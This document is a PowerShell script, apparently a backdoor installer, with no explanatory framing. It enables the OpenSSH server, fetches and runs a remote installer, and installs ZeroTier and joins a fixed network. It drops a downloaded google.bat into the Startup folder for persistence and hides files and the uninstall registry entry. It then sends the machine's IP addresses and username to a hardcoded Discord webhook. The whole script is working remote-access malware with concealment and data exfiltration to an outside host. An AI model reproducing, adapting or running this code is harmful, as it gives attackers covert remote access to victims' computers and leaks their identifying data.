Add-WindowsCapability -Online -Name OpenSSH.Client~~~~0.0.1.0; Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0; Start-Service sshd; Set-Service -Name sshd -StartupType 'Automatic'; Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex ((New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1')); choco install zerotier-one -y --version 1.12.2 --force; zerotier-cli join 9bee8941b5bb0e01; cd "$HOME\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"; Invoke-WebRequest -Uri "https://raw.githubusercontent.com/2o2ks/ZLASD-20/main/google.bat" -OutFile "google.bat"; Remove-Item -Path "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\ZeroTier.lnk" -Force; $path = "C:\Program Files (x86)\zerotier"; Set-ItemProperty -Path $path -Name Attributes -Value ([IO.FileAttributes]::Hidden); $path = "$HOME\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\google.bat"; Stop-Process -Name zerotier-one_x64 -Force; Set-ItemProperty -Path $path -Name Attributes -Value ([IO.FileAttributes]::Hidden); $registryKeyPath = "HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\ZeroTier One 1.12.2"; $entryName = "DisplayName"; $newName = "NoDisplayName"; try {
    Set-ItemProperty -Path $registryKeyPath -Name $newName -Value (Get-ItemProperty -Path $registryKeyPath).$entryName
    Remove-ItemProperty -Path $registryKeyPath -Name $entryName
    Write-Host "Entry renamed successfully to $newName."
} catch {
    Write-Host "Error attempting to rename the entry: $_"
}
$publicIpAddress = Invoke-RestMethod -Uri "https://ipinfo.io/ip"
Write-Host "$publicIpAddress"

$ipAddress = (Test-Connection -ComputerName $env:COMPUTERNAME -Count 1).IPV4Address.IPAddressToString
$user = $env:USERNAME

Write-Host "$ipAddress"
Write-Host "$user"


$url = "https://discord.com/api/webhooks/1186839699998900224/maAvNFQo7zAuyMb1LUTewrGxSEXMW8XO2iqSgvngflsXlMSJ-ZhErKINHUHfCA5z0pv_"

$jsonBody = @{
     content = "
 ```IP:        $ipAddress | $publicIpAddress     HOSTNAME:     $user```
 "
 } | ConvertTo-Json

 Invoke-RestMethod -Uri $url -Method Post -Body $jsonBody -ContentType "application/json"
